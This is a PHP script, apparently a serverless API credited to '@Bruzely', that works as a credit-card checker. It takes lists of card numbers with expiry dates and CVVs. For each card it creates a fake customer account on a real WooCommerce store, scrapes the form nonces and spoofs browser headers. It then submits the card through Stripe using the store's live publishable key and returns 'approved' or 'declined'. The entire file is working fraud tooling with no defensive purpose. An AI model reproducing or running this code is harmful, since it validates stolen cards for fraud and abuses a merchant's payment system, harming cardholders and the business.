<?php
require 'vendor/autoload.php';

use GuzzleHttp\Client;
use GuzzleHttp\Promise;
use Ramsey\Uuid\Uuid;

header('Content-Type: application/json');

function parseX($data, $start, $end) {
    try {
        $startPos = strpos($data, $start) + strlen($start);
        $endPos = strpos($data, $end, $startPos);
        if ($startPos === false || $endPos === false) {
            return "None";
        }
        return substr($data, $startPos, $endPos - $startPos);
    } catch (Exception $e) {
        return "None";
    }
}

function process_cc($card) {
    try {
        $client = new Client(['timeout' => 10]);
        $guid = Uuid::uuid4()->toString();
        $muid = Uuid::uuid4()->toString();
        $sid = Uuid::uuid4()->toString();

        list($cc, $mon, $year, $cvv) = explode('|', $card);
        $year = substr($year, -2);

        $base_name = "alex";
        $domain = "gmail.com";
        $number = rand(1000, 99999);
        $suffix = substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 3);
        $email = "{$base_name}{$number}{$suffix}@{$domain}";

        $headers = [
            'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language' => 'en-US,en;q=0.9',
            'cache-control' => 'no-cache',
            'pragma' => 'no-cache',
            'priority' => 'u=0, i',
            'referer' => 'https://robosoft.ai/my-account/add-payment-method/',
            'sec-ch-ua' => '"Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            'sec-ch-ua-mobile' => '?0',
            'sec-ch-ua-platform' => '"Windows"',
            'sec-fetch-dest' => 'document',
            'sec-fetch-mode' => 'navigate',
            'sec-fetch-site' => 'same-origin',
            'sec-fetch-user' => '?1',
            'sec-gpc' => '1',
            'upgrade-insecure-requests' => '1',
            'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
        ];

        // Step 1: Get registration nonce
        $response1 = $client->get('https://robosoft.ai/my-account/', ['headers' => $headers]);
        $regi = parseX((string)$response1->getBody(), '<input type="hidden" id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="', '" />');

        // Step 2: Register
        $headers2 = array_merge($headers, [
            'content-type' => 'application/x-www-form-urlencoded',
            'origin' => 'https://robosoft.ai',
        ]);
        $data2 = http_build_query([
            'email' => $email,
            'woocommerce-register-nonce' => $regi,
            '_wp_http_referer' => '/my-account/',
            'register' => 'Register',
        ]);
        $response2 = $client->post('https://robosoft.ai/my-account/', ['headers' => $headers2, 'body' => $data2]);

        // Step 3-5: Navigate to payment method page
        $client->get('https://robosoft.ai/my-account/', ['headers' => $headers]);
        $client->get('https://robosoft.ai/my-account/payment-methods/', ['headers' => $headers]);
        $response5 = $client->get('https://robosoft.ai/my-account/add-payment-method/', ['headers' => $headers]);
        $nonce = parseX((string)$response5->getBody(), '"add_card_nonce":"', '",');

        // Step 6: Create Stripe source
        $headers6 = [
            'accept' => 'application/json',
            'accept-language' => 'en-US,en;q=0.9',
            'cache-control' => 'no-cache',
            'content-type' => 'application/x-www-form-urlencoded',
            'origin' => 'https://js.stripe.com',
            'pragma' => 'no-cache',
            'priority' => 'u=1, i',
            'referer' => 'https://js.stripe.com/',
            'sec-ch-ua' => '"Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            'sec-ch-ua-mobile' => '?0',
            'sec-ch-ua-platform' => '"Windows"',
            'sec-fetch-dest' => 'empty',
            'sec-fetch-mode' => 'cors',
            'sec-fetch-site' => 'same-site',
            'sec-gpc' => '1',
            'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
        ];
        $data6 = http_build_query([
            'referrer' => 'https://robosoft.ai',
            'type' => 'card',
            'owner[name]' => ' ',
            'owner[email]' => $email,
            'card[number]' => $cc,
            'card[cvc]' => $cvv,
            'card[exp_month]' => $mon,
            'card[exp_year]' => $year,
            'guid' => $guid,
            'muid' => $muid,
            'sid' => $sid,
            'pasted_fields' => 'number,cvc',
            'payment_user_agent' => 'stripe.js/4d9faf87d7; stripe-js-v3/4d9faf87d7; split-card-element',
            'time_on_page' => rand(100000, 200000),
            'key' => 'pk_live_51IzngzANzfGIJhh4KJQYpleKU8VWHVJmAnUz7jJHqZmKScLCK2vBwixs0ELbw8VvtRHX7eaaMMNy4wFxYaJAbKro00OEy5fkOA',
        ]);
        $response6 = $client->post('https://api.stripe.com/v1/sources', ['headers' => $headers6, 'body' => $data6]);
        $source_response = json_decode((string)$response6->getBody(), true);
        $source_id = $source_response['id'] ?? 'None';

        // Step 7: Create setup intent
        $headers7 = [
            'accept' => 'application/json, text/javascript, */*; q=0.01',
            'accept-language' => 'en-US,en;q=0.9',
            'cache-control' => 'no-cache',
            'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin' => 'https://robosoft.ai',
            'pragma' => 'no-cache',
            'priority' => 'u=1, i',
            'referer' => 'https://robosoft.ai/my-account/add-payment-method/',
            'sec-ch-ua' => '"Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            'sec-ch-ua-mobile' => '?0',
            'sec-ch-ua-platform' => '"Windows"',
            'sec-fetch-dest' => 'empty',
            'sec-fetch-mode' => 'cors',
            'sec-fetch-site' => 'same-origin',
            'sec-gpc' => '1',
            'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
            'x-requested-with' => 'XMLHttpRequest',
        ];
        $data7 = http_build_query([
            'stripe_source_id' => $source_id,
            'nonce' => $nonce,
        ]);
        $response7 = $client->post('https://robosoft.ai/?wc-ajax=wc_stripe_create_setup_intent', ['headers' => $headers7, 'body' => $data7]);

        $response_json = json_decode((string)$response7->getBody(), true);
        if ($response7->getStatusCode() == 200 && isset($response_json['result']) && $response_json['result'] == 'success') {
            return [
                'status' => 'approved',
                'card' => $card,
                'message' => 'Card successfully approved!',
                'Api by' => '@Bruzely'
            ];
        } else {
            return [
                'status' => 'declined',
                'card' => $card,
                'message' => 'Your card was declined or not accepted by Stripe',
                'Api by' => '@Bruzely'
            ];
        }
    } catch (Exception $e) {
        return [
            'status' => 'declined',
            'card' => $card,
            'message' => 'Error: ' . $e->getMessage(),
            'Api by' => '@Bruzely'
        ];
    }
}

// Handle /ping
if ($_SERVER['REQUEST_METHOD'] === 'GET' && $_SERVER['REQUEST_URI'] === '/ping') {
    $start_time = microtime(true);
    echo json_encode([
        'status' => 'healthy',
        'response_time_ms' => (microtime(true) - $start_time) * 1000,
        'Api by' => '@Bruzely'
    ], JSON_PRETTY_PRINT);
    exit;
}

// Handle /check_cc
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_SERVER['REQUEST_URI'] === '/check_cc') {
    $input = json_decode(file_get_contents('php://input'), true);
    $cards = $input['cards'] ?? [];

    if (empty($cards)) {
        echo json_encode(['error' => 'No cards provided', 'Api by' => '@Bruzely'], JSON_PRETTY_PRINT);
        http_response_code(400);
        exit;
    }

    // Process cards synchronously for Vercel (async not reliable in serverless)
    $results = [];
    foreach ($cards as $card) {
        $results[] = process_cc($card);
    }

    echo json_encode(['results' => $results, 'Api by' => '@Bruzely'], JSON_PRETTY_PRINT);
    exit;
}

http_response_code(404);
echo json_encode(['error' => 'Not found', 'Api by' => '@Bruzely'], JSON_PRETTY_PRINT);
